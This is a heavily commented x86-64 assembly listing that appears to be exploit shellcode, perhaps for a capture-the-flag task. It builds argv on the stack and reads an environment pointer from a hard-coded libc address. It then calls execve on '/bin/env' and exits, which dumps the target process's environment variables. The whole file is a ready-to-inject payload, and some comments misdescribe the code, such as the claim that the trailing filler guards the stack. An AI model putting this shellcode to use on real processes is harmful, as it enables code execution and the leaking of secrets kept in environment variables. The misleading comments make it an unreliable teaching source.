bits 64 
        ; find out where we are
start:  ; code start

      ; zeroing out rax by XORing it with itself
      ; rax is often used for system call numbers and return values from system calls
      xor rax, rax
      ; pushing command name onto the stack
      ; this will act as a null terminator for a string array later
      push rax
      ; the address of the string '/bin/env' is moved into rdi and pushed onto the stack, indicating a command to be executed
      mov rdi, '/bin/env'
      push rdi
      ; put address of command in rdi
      mov rdi, rsp
      ; creating argv array  
      push rax
      push rdi
      ; move stack pointer into rsi, rsi will point to the argv array.
      mov rsi, rsp
      
      ; setting up rdx (environment variable pointer)
      ; clear the rdx register (all 0 bits)
      xor rdx, rdx
      ; load 0x7fff into the low 16 bits of the rdx register (called dx)
      mov dx, 0x7fff
      ; left shift the rdx register by 32 bits (to bits 33 to 47)
      shl rdx, 32
      ; load 0xf7fbe6ff into the low 32 bits of rcx (called ecx, this also clears the rest of rex)
      mov ecx, 0xf7fbe6ff
      ; clear the low 8 bits of the rcx register (called cl)
      xor cl, cl
      ; combine the registers using the or instruction
      or rdx, rcx
      ; load the rdx register with the memory pointed to by the rdx register
      mov rdx, [rdx]
      
      ; system call number for execve (which executes a program) is moved into the al register (which is the lower 8 bits of rax), and the syscall instruction is executed
      ; this should run the '/bin/env' command with the given argv and environment variables.
      mov al, 0x3b
      ; system call to execute command
      syscall
      ; the return value (in rax) is moved into rdi, and another system call is prepared
      mov rdi, rax
      mov al, 0x3c
      ; system call executed with number 0x3c
      syscall
      ; section reserves space to ensure that the stack does not overflow into the code
      ; dq is an instruction to define a quad word (64 bits), and 0xffffffffffffffff is just a filler value
      dq 0xffffffffffffffff
      dq 0xffffffffffffffff
      dq 0xffffffffffffffff
      dq 0xffffffffffffffff
      dq 0xffffffffffffffff
end:  dd end-start